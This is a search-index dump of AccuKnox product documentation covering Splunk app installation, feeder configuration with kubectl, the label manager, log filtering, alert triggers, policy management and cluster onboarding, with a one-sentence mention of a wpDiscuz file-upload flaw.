open-source repo that also contains a wide range of attack prevention techniques including MITRE, as well as hardening techniques for your workloads. Please visit policy-templates to download and apply policy policies.","title":"AccuKnox's policy templates repository"},{"location":"how-to/protect-wordpress-application/#conclusion","text":"In this post, we detailed a flaw in wpDiscuz that provided unauthenticated users with the ability to upload arbitrary files, including PHP files, and execute those files on the server. Thus leading to an RCE and resource hijacking. Using KubeArmor , an organization can effectively protect against these sorts of accidental developer-introduced vulnerabilities.","title":"Conclusion"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/","text":"AccuKnox Splunk App \u00b6 Introduction \u00b6 The AccuKnox Splunk App is designed to deliver operational reporting as well as a simplified and configurable dashboard. Users can view the real-time alerts in form of logs and telemetries. Important features - Dashboard to track the real time alerts genrated from K8s cluster. - Datamodels with pivots for easy access to data and visualization. - Filter out the Alerts based on defferent namespaces, pods, operations, severity, tags and the actions of policies. - Drilldown ability to see how the alerts genrated, what policy was violated and what was the result for the same. Installation \u00b6 Prerequisites : \u00b6 1. K8s Cluster with Accuknox agents installed, up and running fine. KubeArmor and Feeder Service are mandatory. The environment variable for the feeder is set for the K8s cluster in use. 2. An active Splunk Deployment and Access to the same. To depoy Splunk on Kubernetes Cluster follow https://splunk.github.io/splunk-operator/ and for Linux follow https://docs.splunk.com/Documentation/Splunk/9.0.1/Installation/InstallonLinux Where to install it? \u00b6 Splunk App can be installed on Splunk Enterprise Deployment done on K8s or VM. User can install the App using three different ways. Option 1: Install from File \u00b6 This App can be installed by Uploading the file to the Splunk UI. 1. Download the AccuKnox Splunk App file, by typing the following command,This file can be downloaded anywhere from where the user can upload the file to Splunk UI. git clone https://github.com/accuknox/splunk.git AccuKnox tar -czvf AccuKnox.tar.gz AccuKnox 2. Log in to your Splunk Deployment. 3. Click on the gear icon next to Apps. 4. This will navigate you to the Apps Dashboard. On the top right, click on Install app from file. 5. This will navigate to Upload App Screen. Select AccuKnox.tar.gz file downloaded in the first step , and upload. In case you are updating the app and it\u2019s already installed, mark the check box for Upgrade App. 6. Once Uploaded the App will be installed on the Splunk Deployment, with a confirmation message, \u201c AccuKnox\" was installed successfully. Click on Launch App to view the App. 7. You can Restart Splunk for the App to work properly. Go to Settings > Server Control > Restart Splunk, Restarting the app will take approx. 1-2 minutes. 8. Wait for Splunk to Restart And you can log in back to see the AccuKnox App in the App section. 9. Click on the AccuKnox App to launch the App. This will navigate you to the App dashboard. *Note: If Dashboards shows no data, you need to configure the HEC on Splunk and Forward the data first, check below how to configure and create HEC and forward the data . If data is not being pushed, Login to Splunk > Setting > Data Input > Select HTTP Event Collector > Global Settings > Disable SSL if Enabled by unchecking the box. Option 2: Install the App from SplunkBase \u00b6 Install the AccuKnox App by downloading it from the App homepage. Option 3: Install from GitHub \u00b6 This App is available on SplunkBase and Github . Optionally, you can clone the GitHub repository to install the App. Please feel free to submit contributions to the App using pull requests on GitHub. Locate the Splunk Deployment done in your environment. Navigate to the Splunk App directory. For Linux users /opt/splunk/etc/apps and windows users \\Program Files\\Splunk\\etc\\apps From the directory $SPLUNK_HOME/etc/apps/ , type the following command: git clone https://github.com/accuknox/splunk.git AccuKnox Forwarding Events to Splunk from Feeder \u00b6 Prerequisites: 1. Feeder Service and KubeArmor are Installed and running on the user\u2019s K8s Cluster. A sample application can be used to generate the alerts, check how to deploy a sample application , and generate alerts. Configuring feeder for the first time to forward the events: \u00b6 1 . Assuming the user is inside their K8s Cluster, type the following command to edit the feeder deployment. kubectl edit deployment feeder-service -n accuknox-agents 2 . The below Configuration parameters needs be updated for Splunk configuration. (Default params in code blocks need to be modified, line number 93 of feeder chart ) To start editing press Insert button name: SPLUNK_FEEDER_ENABLED value: false change value to true to enable the feed name: SPLUNK_FEEDER_URL value: https://<splunk-host> change value to the HEC URL created, check how to create HEC. name: SPLUNK_FEEDER_TOKEN value: \" x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000\" change the value with generated token for HEC name: SPLUNK_FEEDER_SOURCE_TYPE value: \"http:kafka\" change the value to http:kafka if not added name: SPLUNK_FEEDER_SOURCE _ value: _ \"json\" change the value as per your choice name: SPLUNK_FEEDER_INDEX value: \"main\" change the value as to main Hit ctrl + c once editing is done, and enter :wq and hit enter to save the configuration. \u00b6 Additionaly you can Enable and Disable the event forwarding by Enabling/Disabling Splunk (Runtime): kubectl set env deploy/feeder-service SPLUNK_FEEDER_ENABLED = \"true\" -n accuknox-agents By enabling the flag to true (as above), the events will be pushed to Splunk. And disabling it to false will stop pushing logs. Note* : Likewise other configuration parameters can be updated in Runtime.* \u00b6","title":"How to Install AccuKnox Splunk App and forward the events"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#accuknox-splunk-app","text":"","title":"AccuKnox Splunk App"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#introduction","text":"The AccuKnox Splunk App is designed to deliver operational reporting as well as a simplified and configurable dashboard. Users can view the real-time alerts in form of logs and telemetries. Important features - Dashboard to track the real time alerts genrated from K8s cluster. - Datamodels with pivots for easy access to data and visualization. - Filter out the Alerts based on defferent namespaces, pods, operations, severity, tags and the actions of policies. - Drilldown ability to see how the alerts genrated, what policy was violated and what was the result for the same.","title":"Introduction"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#installation","text":"","title":"Installation"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#prerequisites","text":"1. K8s Cluster with Accuknox agents installed, up and running fine. KubeArmor and Feeder Service are mandatory. The environment variable for the feeder is set for the K8s cluster in use. 2. An active Splunk Deployment and Access to the same. To depoy Splunk on Kubernetes Cluster follow https://splunk.github.io/splunk-operator/ and for Linux follow https://docs.splunk.com/Documentation/Splunk/9.0.1/Installation/InstallonLinux","title":"Prerequisites :"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#where-to-install-it","text":"Splunk App can be installed on Splunk Enterprise Deployment done on K8s or VM. User can install the App using three different ways.","title":"Where to install it?"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#option-1-install-from-file","text":"This App can be installed by Uploading the file to the Splunk UI. 1. Download the AccuKnox Splunk App file, by typing the following command,This file can be downloaded anywhere from where the user can upload the file to Splunk UI. git clone https://github.com/accuknox/splunk.git AccuKnox tar -czvf AccuKnox.tar.gz AccuKnox 2. Log in to your Splunk Deployment. 3. Click on the gear icon next to Apps. 4. This will navigate you to the Apps Dashboard. On the top right, click on Install app from file. 5. This will navigate to Upload App Screen. Select AccuKnox.tar.gz file downloaded in the first step , and upload. In case you are updating the app and it\u2019s already installed, mark the check box for Upgrade App. 6. Once Uploaded the App will be installed on the Splunk Deployment, with a confirmation message, \u201c AccuKnox\" was installed successfully. Click on Launch App to view the App. 7. You can Restart Splunk for the App to work properly. Go to Settings > Server Control > Restart Splunk, Restarting the app will take approx. 1-2 minutes. 8. Wait for Splunk to Restart And you can log in back to see the AccuKnox App in the App section. 9. Click on the AccuKnox App to launch the App. This will navigate you to the App dashboard. *Note: If Dashboards shows no data, you need to configure the HEC on Splunk and Forward the data first, check below how to configure and create HEC and forward the data . If data is not being pushed, Login to Splunk > Setting > Data Input > Select HTTP Event Collector > Global Settings > Disable SSL if Enabled by unchecking the box.","title":"Option 1: Install from File"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#option-2-install-the-app-from-splunkbase","text":"Install the AccuKnox App by downloading it from the App homepage.","title":"Option 2: Install the App from SplunkBase"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#option-3-install-from-github","text":"This App is available on SplunkBase and Github . Optionally, you can clone the GitHub repository to install the App. Please feel free to submit contributions to the App using pull requests on GitHub. Locate the Splunk Deployment done in your environment. Navigate to the Splunk App directory. For Linux users /opt/splunk/etc/apps and windows users \\Program Files\\Splunk\\etc\\apps From the directory $SPLUNK_HOME/etc/apps/ , type the following command: git clone https://github.com/accuknox/splunk.git AccuKnox","title":"Option 3: Install from GitHub"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#forwarding-events-to-splunk-from-feeder","text":"Prerequisites: 1. Feeder Service and KubeArmor are Installed and running on the user\u2019s K8s Cluster. A sample application can be used to generate the alerts, check how to deploy a sample application , and generate alerts.","title":"Forwarding Events to Splunk from Feeder"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#configuring-feeder-for-the-first-time-to-forward-the-events","text":"1 . Assuming the user is inside their K8s Cluster, type the following command to edit the feeder deployment. kubectl edit deployment feeder-service -n accuknox-agents 2 . The below Configuration parameters needs be updated for Splunk configuration. (Default params in code blocks need to be modified, line number 93 of feeder chart ) To start editing press Insert button name: SPLUNK_FEEDER_ENABLED value: false change value to true to enable the feed name: SPLUNK_FEEDER_URL value: https://<splunk-host> change value to the HEC URL created, check how to create HEC. name: SPLUNK_FEEDER_TOKEN value: \" x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000\" change the value with generated token for HEC name: SPLUNK_FEEDER_SOURCE_TYPE value: \"http:kafka\" change the value to http:kafka if not added name: SPLUNK_FEEDER_SOURCE _ value: _ \"json\" change the value as per your choice name: SPLUNK_FEEDER_INDEX value: \"main\" change the value as to main Hit ctrl + c once editing is done, and enter :wq and hit enter to save the configuration.","title":"Configuring feeder for the first time to forward the events:"},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#_1","text":"Additionaly you can Enable and Disable the event forwarding by Enabling/Disabling Splunk (Runtime): kubectl set env deploy/feeder-service SPLUNK_FEEDER_ENABLED = \"true\" -n accuknox-agents By enabling the flag to true (as above), the events will be pushed to Splunk. And disabling it to false will stop pushing logs. Note* : Likewise other configuration parameters can be updated in Runtime.*","title":""},{"location":"how-to/SplunkApp/AccuKnox-splunk-app-installation-configuration/#_2","text":"","title":""},{"location":"how-to/SplunkApp/Images/info/","text":"This folder contains the images linked to AccuKnox Splunk App help docs.","title":"Info"},{"location":"label_manager/create_label/","text":"The label manager displays currently available labels in your workspace. Users can manually create a new label and add entities to the label. Create a label: \u00b6 Click Label Manager -> Create Label Enter key and value. Change the color of the label if you want. Click save button Add entities to label: \u00b6 Once the user created the label, next needs to associate entities to the label. From two screens users can associate entities. From Label Manager: \u00b6 After the creation of a new label, the user can associate entities from the existing screen. click +Add Entities select the desired entities from the window and click Add to associate the created label to the selected entities. You can also add entities to previously created labels. select Add Entities from the default screen of the Label Manager From Cluster Manager: \u00b6 Right-click on any entity such as pods, then click +Add Label Search the desired label and click Add to associate the entity to the selected label. Check newly created label in the label list click Label Manager \u2192 select the new label from the list","title":"How to create a new label?"},{"location":"label_manager/create_label/#create-a-label","text":"Click Label Manager -> Create Label Enter key and value. Change the color of the label if you want. Click save button","title":"Create a label:"},{"location":"label_manager/create_label/#add-entities-to-label","text":"Once the user created the label, next needs to associate entities to the label. From two screens users can associate entities.","title":"Add entities to label:"},{"location":"label_manager/create_label/#from-label-manager","text":"After the creation of a new label, the user can associate entities from the existing screen. click +Add Entities select the desired entities from the window and click Add to associate the created label to the selected entities. You can also add entities to previously created labels. select Add Entities from the default screen of the Label Manager","title":"From Label Manager:"},{"location":"label_manager/create_label/#from-cluster-manager","text":"Right-click on any entity such as pods, then click +Add Label Search the desired label and click Add to associate the entity to the selected label. Check newly created label in the label list click Label Manager \u2192 select the new label from the list","title":"From Cluster Manager:"},{"location":"label_manager/edit_remove_labels/","text":"Edit label \u00b6 click Label Manager The list of labels is displayed. click right corner More options icon ,then click Edit Delete Label \u00b6 click Label Manager The list of labels is displayed. click right corner More options icon ,then click Delete Note: If you delete the label, label will be removed from the assocaited entities.","title":"Edit and Remove the labels"},{"location":"label_manager/edit_remove_labels/#edit-label","text":"click Label Manager The list of labels is displayed. click right corner More options icon ,then click Edit","title":"Edit label"},{"location":"label_manager/edit_remove_labels/#delete-label","text":"click Label Manager The list of labels is displayed. click right corner More options icon ,then click Delete Note: If you delete the label, label will be removed from the assocaited entities.","title":"Delete Label"},{"location":"label_manager/overview/","text":"Overview \u00b6 This section helps you navigate to the topics of Label Manager. Label manager lists associated policies and entities grouped by labels. What are labels? View labels and associated entities/policies How to create a new label? Edit and Remove the labels","title":"Overview"},{"location":"label_manager/overview/#overview","text":"This section helps you navigate to the topics of Label Manager. Label manager lists associated policies and entities grouped by labels. What are labels? View labels and associated entities/policies How to create a new label? Edit and Remove the labels","title":"Overview"},{"location":"label_manager/view_labels/","text":"Label manager lists associated policies and entities grouped by labels. Click Label Manager in the left navigation Possible entities can be pod, node, and namespace for Kubernetes. For VM/Bare-metal entities can be instance and Instance group. Associated Policies are the policies that have same label as selector label Select any of the rows to see detailed information about the specific label","title":"View labels and associated entities/policies"},{"location":"label_manager/what_are_labels/","text":"Labels are key/value pairs that are attached to objects, such as pods. Labels are intended to be used to specify identifying attributes of objects that are meaningful and relevant to users but do not directly imply semantics to the core system. Labels can be used to organize and to select subsets of objects. Labels can be attached to objects at creation time and subsequently added and modified at any time. Each object can have a set of key/value labels defined. Each Key must be unique for a given object.","title":"What are labels?"},{"location":"logs_summary/logs/","text":"Logs are the responsive component of Accuknox. Logs are generated in real-time based on certain conditions/rules you configure on the security policies. You will get logs from four different components Network, System, Anomaly Detection, and Data protection. Filter Logs \u00b6 Filter from the drop-down options \u00b6 Click any drop-down to list its attributes. Following are the elements in the drop-down options K8s-cluster/VM \u00b6 To access all the logs from your Kubernetes clusters, select K8s-cluster from the first drop-down menu. Select VM to examine the logs for your virtual machines. Components \u00b6 Logs are generated by the four different components. Network, System, Anomaly Detection, and Data Protection. The logs are generated based on certain conditions/rules you configured on the policies. The logs and policies are coupled together in a way that a log will be created once the policy is invoked. To filter the logs events occurred by the invoked network policies, select component type to Network Similarly, you can filter log events from the system, anomaly detection, and data protection components. Anomaly detection monitors workloads based on their historical behaviors, and a log is generated when they deviate from the expected pattern. Cluster \u00b6 cluster drop-down can be used to filter logs related to specific clusters Namespace \u00b6 Namespace drop-down can be used to filter logs related to specific namespaces Severity \u00b6 Use the appropriate options to filter log events by Critical, High, Medium, Low, and Info level of severity, corresponding to the levels defined in the relevant runtime Policies. Time Ranges \u00b6 As in the rest of the platform interface, the time range can be set by date ranges and in increments from 5 minutes to 60 days. Filter using elements from the log events list \u00b6 Click one or more elements in a log event to add them directly to the filter. Click Save button, to save the selected filter to Saved Filters Directly search elements in the filter \u00b6 You can directly search by the elements, such as \u201cCluster_name\u201d, \u201cFlow_IP_destination\u201d etc visible in the logs. Use Search Filters \u00b6 Search Filters are categorized into three Predefined filters: A set of predefined filters makes the user's log filtering easier. We have incorporated frequent and important elements into these filters. Saved Filters: The saved filters will list all the filters that the user has saved. Unsaved: A set of filters loaded from your cache. It will be available shortly. Channel Integrations \u00b6 Slack Splunk Cloudwatch Elastic JiRA Log Detail Panel \u00b6 Click one of the events in the log to view the details pane. The Log Detail contents vary depending on the selected component type of the log event.","title":"Logs"},{"location":"logs_summary/logs/#filter-logs","text":"","title":"Filter Logs"},{"location":"logs_summary/logs/#filter-from-the-drop-down-options","text":"Click any drop-down to list its attributes. Following are the elements in the drop-down options","title":"Filter from the drop-down options"},{"location":"logs_summary/logs/#k8s-clustervm","text":"To access all the logs from your Kubernetes clusters, select K8s-cluster from the first drop-down menu. Select VM to examine the logs for your virtual machines.","title":"K8s-cluster/VM"},{"location":"logs_summary/logs/#components","text":"Logs are generated by the four different components. Network, System, Anomaly Detection, and Data Protection. The logs are generated based on certain conditions/rules you configured on the policies. The logs and policies are coupled together in a way that a log will be created once the policy is invoked. To filter the logs events occurred by the invoked network policies, select component type to Network Similarly, you can filter log events from the system, anomaly detection, and data protection components. Anomaly detection monitors workloads based on their historical behaviors, and a log is generated when they deviate from the expected pattern.","title":"Components"},{"location":"logs_summary/logs/#cluster","text":"cluster drop-down can be used to filter logs related to specific clusters","title":"Cluster"},{"location":"logs_summary/logs/#namespace","text":"Namespace drop-down can be used to filter logs related to specific namespaces","title":"Namespace"},{"location":"logs_summary/logs/#severity","text":"Use the appropriate options to filter log events by Critical, High, Medium, Low, and Info level of severity, corresponding to the levels defined in the relevant runtime Policies.","title":"Severity"},{"location":"logs_summary/logs/#time-ranges","text":"As in the rest of the platform interface, the time range can be set by date ranges and in increments from 5 minutes to 60 days.","title":"Time Ranges"},{"location":"logs_summary/logs/#filter-using-elements-from-the-log-events-list","text":"Click one or more elements in a log event to add them directly to the filter. Click Save button, to save the selected filter to Saved Filters","title":"Filter using elements from the log events list"},{"location":"logs_summary/logs/#directly-search-elements-in-the-filter","text":"You can directly search by the elements, such as \u201cCluster_name\u201d, \u201cFlow_IP_destination\u201d etc visible in the logs.","title":"Directly search elements in the filter"},{"location":"logs_summary/logs/#use-search-filters","text":"Search Filters are categorized into three Predefined filters: A set of predefined filters makes the user's log filtering easier. We have incorporated frequent and important elements into these filters. Saved Filters: The saved filters will list all the filters that the user has saved. Unsaved: A set of filters loaded from your cache. It will be available shortly.","title":"Use Search Filters"},{"location":"logs_summary/logs/#channel-integrations","text":"Slack Splunk Cloudwatch Elastic JiRA","title":"Channel Integrations"},{"location":"logs_summary/logs/#log-detail-panel","text":"Click one of the events in the log to view the details pane. The Log Detail contents vary depending on the selected component type of the log event.","title":"Log Detail Panel"},{"location":"logs_summary/overview/","text":"The Logs summary in Accuknox displays a complete list of log events that have occurred within the infrastructure during a defined timeline. select Logs Summary in the left navigation It provides an interface to: Find and get insights into security events in your infrastructure Filter the logs to hone into the events that will require further inspection Inspect any specific event using a log detail panel Sent customized alerts to third-party SIEM (security information and event management) platforms and logging tools, such as Slack, Splunk, Elastic Search, Cloud watch, Jira with the help of trigger.","title":"Overview"},{"location":"logs_summary/triggers/","text":"With the use of triggers, AccuKnox can send alerts to third-party SIEM (security information and event management) platforms and logging tools like Slack, Splunk, Elastic Search, Cloud Watch, and Jira. How to create a new trigger? \u00b6 After choosing specific log filter from the Logs Screen, click on Create Trigger button. You can either click elements directly from the log events list, search for elements directly in the filter, or use Search Filters to choose a specific log filter Configure the required options: Name: Define an alert trigger name. When to initiate this trigger: Set the frequency of the trigger. You have four options to select, (1) Runtime as it happens (2) Once a day (3) Once a week (4) Once a month Define Threat Level: Define the threat level for the trigger. You have three options (1) High (2) Medium (3) Low Selected Filter: The chosen log filter from step 1 is populated here. You can shift to predefined filters from here also. Notification channel: Choose the notification channel that should receive the alerts. Note: Before selecting the notification channel, you should complete the channel integration for this channel. Review the Channel Integration for more context. Channel Integration Guide Click Save button to store the trigger in database. Manage Triggers \u00b6 Triggers can be managed individually, or as a group, by using the checkboxes on the left side of the Trigger UI. Select individual/group of triggers and perform actions, such as enabling, disabling, or deleting. View Trigger Details \u00b6 To view Trigger alert details, click the Details of corresponding Tigger alert row. This will give query info of the selected trigger additionally. Enable/Disable Triggers \u00b6 Alerts can be enabled or disabled using the slider or the actions drop-down menu. You can perform these operations on a single trigger or on multiple triggers From the Triggers UI, check the boxes beside the relevant triggers. Click Actions drop-down Click Enable or Disable as necessary. Use the slider beside the trigger to disable or enable individual triggers Edit an Existing Trigger \u00b6 To edit an existing Tigger alert: click Edit from the right corner More options icon of the corresponding trigger alert Edit the trigger, and click Save to confirm the changes. Duplicate a Trigger \u00b6 Triggers can be duplicated so that similar triggers can be created quickly. Click Duplicate from the right corner More options icon of the corresponding trigger alert Make necessary changes and save the trigger. Delete Trigger \u00b6 Open the Triggers page and use one of the following methods to delete triggers: You can perform delete operation on a single trigger or on multiple triggers From the Triggers UI, check the boxes beside the relevant triggers. Click Actions drop-down Click Delete Click Delete from the right corner More options icon of the corresponding trigger to delete individual trigger","title":"Triggers"},{"location":"logs_summary/triggers/#how-to-create-a-new-trigger","text":"After choosing specific log filter from the Logs Screen, click on Create Trigger button. You can either click elements directly from the log events list, search for elements directly in the filter, or use Search Filters to choose a specific log filter Configure the required options: Name: Define an alert trigger name. When to initiate this trigger: Set the frequency of the trigger. You have four options to select, (1) Runtime as it happens (2) Once a day (3) Once a week (4) Once a month Define Threat Level: Define the threat level for the trigger. You have three options (1) High (2) Medium (3) Low Selected Filter: The chosen log filter from step 1 is populated here. You can shift to predefined filters from here also. Notification channel: Choose the notification channel that should receive the alerts. Note: Before selecting the notification channel, you should complete the channel integration for this channel. Review the Channel Integration for more context. Channel Integration Guide Click Save button to store the trigger in database.","title":"How to create a new trigger?"},{"location":"logs_summary/triggers/#manage-triggers","text":"Triggers can be managed individually, or as a group, by using the checkboxes on the left side of the Trigger UI. Select individual/group of triggers and perform actions, such as enabling, disabling, or deleting.","title":"Manage Triggers"},{"location":"logs_summary/triggers/#view-trigger-details","text":"To view Trigger alert details, click the Details of corresponding Tigger alert row. This will give query info of the selected trigger additionally.","title":"View Trigger Details"},{"location":"logs_summary/triggers/#enabledisable-triggers","text":"Alerts can be enabled or disabled using the slider or the actions drop-down menu. You can perform these operations on a single trigger or on multiple triggers From the Triggers UI, check the boxes beside the relevant triggers. Click Actions drop-down Click Enable or Disable as necessary. Use the slider beside the trigger to disable or enable individual triggers","title":"Enable/Disable Triggers"},{"location":"logs_summary/triggers/#edit-an-existing-trigger","text":"To edit an existing Tigger alert: click Edit from the right corner More options icon of the corresponding trigger alert Edit the trigger, and click Save to confirm the changes.","title":"Edit an Existing Trigger"},{"location":"logs_summary/triggers/#duplicate-a-trigger","text":"Triggers can be duplicated so that similar triggers can be created quickly. Click Duplicate from the right corner More options icon of the corresponding trigger alert Make necessary changes and save the trigger.","title":"Duplicate a Trigger"},{"location":"logs_summary/triggers/#delete-trigger","text":"Open the Triggers page and use one of the following methods to delete triggers: You can perform delete operation on a single trigger or on multiple triggers From the Triggers UI, check the boxes beside the relevant triggers. Click Actions drop-down Click Delete Click Delete from the right corner More options icon of the corresponding trigger to delete individual trigger","title":"Delete Trigger"},{"location":"manage_policies/manage_policies/","text":"Policy Management Life Cycle \u00b6 Once you successfully onboarded the cluster. You are good to go. You can create policies from scratch to secure your cloud environment. You can also make use of auto discovered policies and a number of predefined recommended policies. Overview \u00b6 Create/Add policy Define basic parameters like cluster, namespace etc. Add Rules Approve Policy Create Policy Manually: \u00b6 From two screens you can create/Add Policies. Add Policy from Cluster Manager Dashboard. \u00b6 Log in to Accuknox select Cluster Manager Dashboard from the left navigation bar. Right Click on any entity such as node and pod. Select Add Policy Create Policy from Policy Manager \u00b6 Log in to Accuknox and select Policy Manager -> All Policies On the All Policies page, select Create Policy Define basic policy parameters \u00b6 Define the basic parameters of the policy before adding the rules. Policy Name Name of the Policy Description Description for the Policy Policy Type Policy Type can be Network-Ingress, Network-Egress and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restrict behavior at system level. To set up the network security select policy type to be Network-ingress or Network-egress. Namespace Namespace will tell in which namespace that policy is going to apply. Default/Node This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster. Labels Labels are used to select specified endpoints (in most cases it will be pods) and nodes. Create/Add Network Policy \u00b6 To set up the network security policies select policy type to be Network-ingress or Network-egress when you define policy type. select Create/Add Policy -> Policy type -> Network-ingress/Network-egress Create/Add Kubearmor(System) Policy \u00b6 To set up the application security policies select policy type to be System when you define policy type. select Create/Add Policy \u2192 Policy type -> System Add Rules \u00b6 Once the Policy has been created, You will be directed to the Add rules screen. Another way is to select Policy Manager \u2192 All Policies. Selecting a policy from All Policies list page will expand the policy details and access + icon to add rules. The Add rule interface provides an easy way to add rules to or remove rules from a Policy; Rules will differ based on your policy type you chose. See also: Policies and Rules Approve Policy \u00b6 After you add the rules to policy, Policy will be shifted to Pending state. Then to make it active, you need to approve the policy. Select Policy Manager -> Pending Approval On the Pending Approval list page, Approve your specific policy. Go to Policy Manager -> All Policies list page, You can see recently approved policy with status active . Edit Policy \u00b6 Select a row in the All policies list to expand the policy details and access the + icon to Edit the policy by adding new rules. You can also edit/delete the existing rules by accessing the three dots icon appearing on the right end of specific rules. Delete Policy \u00b6 Select Policy Manager -> All Policies Click three dot icon on the right end of a specific row. Click Delete Policy . Auto discovered policies \u00b6 Auto Discovery is a policy recommendation system that suggests network and system policies based on the collected network and system logs respectively. You can review and apply the auto discovered policies. Applying auto discovered network policies will strengthen your network security. Select Policy Manager \u2192 Auto Discovered Policies On the Auto Discovered Policies list page, you can filter out different types of policies. Select one or more policies by ticking the rows. Select Action -> Apply Select Policy Manager -> Pending Approval -> Approve See also: Auto Discovered Policies Recommended policies \u00b6 Accuknox provides a number of out-of-the-box recommended policies based on popular workloads or for the host. These policies are recommended to you only after analyzing your workloads and hosts. These policies will cover known CVEs and attack vectors, compliance frameworks (such as MITRE, PCI-DSS, STIG, etc.) and many more. Select Policy Manager -> Recommended Policies On the Recommended Policies list page, You can see all the recommended policies based on your workloads and hosts. Select one or more policies, the click Apply On the Apply page, selector labels will be preselected associated with your workloads. You can review labels and if you want to change the labels you can also do it. Selector labels will decide where selected policies are going to apply. After Apply; Select Policy Manager -> Pending Approval -> Approve","title":"Manage policies"},{"location":"manage_policies/manage_policies/#policy-management-life-cycle","text":"Once you successfully onboarded the cluster. You are good to go. You can create policies from scratch to secure your cloud environment. You can also make use of auto discovered policies and a number of predefined recommended policies.","title":"Policy Management Life Cycle"},{"location":"manage_policies/manage_policies/#overview","text":"Create/Add policy Define basic parameters like cluster, namespace etc. Add Rules Approve Policy","title":"Overview"},{"location":"manage_policies/manage_policies/#create-policy-manually","text":"From two screens you can create/Add Policies.","title":"Create Policy Manually:"},{"location":"manage_policies/manage_policies/#add-policy-from-cluster-manager-dashboard","text":"Log in to Accuknox select Cluster Manager Dashboard from the left navigation bar. Right Click on any entity such as node and pod. Select Add Policy","title":"Add Policy from Cluster Manager Dashboard."},{"location":"manage_policies/manage_policies/#create-policy-from-policy-manager","text":"Log in to Accuknox and select Policy Manager -> All Policies On the All Policies page, select Create Policy","title":"Create Policy from Policy Manager"},{"location":"manage_policies/manage_policies/#define-basic-policy-parameters","text":"Define the basic parameters of the policy before adding the rules. Policy Name Name of the Policy Description Description for the Policy Policy Type Policy Type can be Network-Ingress, Network-Egress and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restrict behavior at system level. To set up the network security select policy type to be Network-ingress or Network-egress. Namespace Namespace will tell in which namespace that policy is going to apply. Default/Node This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster. Labels Labels are used to select specified endpoints (in most cases it will be pods) and nodes.","title":"Define basic policy parameters"},{"location":"manage_policies/manage_policies/#createadd-network-policy","text":"To set up the network security policies select policy type to be Network-ingress or Network-egress when you define policy type. select Create/Add Policy -> Policy type -> Network-ingress/Network-egress","title":"Create/Add Network Policy"},{"location":"manage_policies/manage_policies/#createadd-kubearmorsystem-policy","text":"To set up the application security policies select policy type to be System when you define policy type. select Create/Add Policy \u2192 Policy type -> System","title":"Create/Add Kubearmor(System) Policy"},{"location":"manage_policies/manage_policies/#add-rules","text":"Once the Policy has been created, You will be directed to the Add rules screen. Another way is to select Policy Manager \u2192 All Policies. Selecting a policy from All Policies list page will expand the policy details and access + icon to add rules. The Add rule interface provides an easy way to add rules to or remove rules from a Policy; Rules will differ based on your policy type you chose. See also: Policies and Rules","title":"Add Rules"},{"location":"manage_policies/manage_policies/#approve-policy","text":"After you add the rules to policy, Policy will be shifted to Pending state. Then to make it active, you need to approve the policy. Select Policy Manager -> Pending Approval On the Pending Approval list page, Approve your specific policy. Go to Policy Manager -> All Policies list page, You can see recently approved policy with status active .","title":"Approve Policy"},{"location":"manage_policies/manage_policies/#edit-policy","text":"Select a row in the All policies list to expand the policy details and access the + icon to Edit the policy by adding new rules. You can also edit/delete the existing rules by accessing the three dots icon appearing on the right end of specific rules.","title":"Edit Policy"},{"location":"manage_policies/manage_policies/#delete-policy","text":"Select Policy Manager -> All Policies Click three dot icon on the right end of a specific row. Click Delete Policy .","title":"Delete Policy"},{"location":"manage_policies/manage_policies/#auto-discovered-policies","text":"Auto Discovery is a policy recommendation system that suggests network and system policies based on the collected network and system logs respectively. You can review and apply the auto discovered policies. Applying auto discovered network policies will strengthen your network security. Select Policy Manager \u2192 Auto Discovered Policies On the Auto Discovered Policies list page, you can filter out different types of policies. Select one or more policies by ticking the rows. Select Action -> Apply Select Policy Manager -> Pending Approval -> Approve See also: Auto Discovered Policies","title":"Auto discovered policies"},{"location":"manage_policies/manage_policies/#recommended-policies","text":"Accuknox provides a number of out-of-the-box recommended policies based on popular workloads or for the host. These policies are recommended to you only after analyzing your workloads and hosts. These policies will cover known CVEs and attack vectors, compliance frameworks (such as MITRE, PCI-DSS, STIG, etc.) and many more. Select Policy Manager -> Recommended Policies On the Recommended Policies list page, You can see all the recommended policies based on your workloads and hosts. Select one or more policies, the click Apply On the Apply page, selector labels will be preselected associated with your workloads. You can review labels and if you want to change the labels you can also do it. Selector labels will decide where selected policies are going to apply. After Apply; Select Policy Manager -> Pending Approval -> Approve","title":"Recommended policies"},{"location":"onboarding/installation/","text":"This guide describes the deployment of AccuKnox agents in various environments: Kubernetes Virtual Machine [coming soon]","title":"Onboarding"},{"location":"onboarding/onboarding/","text":"Step 1: Log in to AccuKnox SaaS as Admin and select Workspace Manager > Oboarding > Cluster onboard > onboard now> Select your Cloud account . Step 2: Select the service provider from the dropdown. Step 3: Select the Region/Zone where the cluster is running Step 4: Enter the cluster name which you want to onboard into SaaS platform and click on Save & Next. Step 5: Copy the code snippet under List of Agents to deploy necessary agents required into your Kubernetes cluster. Tip: To copy/paste the commands follow these steps Step 6: Verify service status Check Troubleshooting in case of permissions or conflict errors.","title":"Onboarding steps"},{"location":"onboarding/pre-requisites/","text":"It is 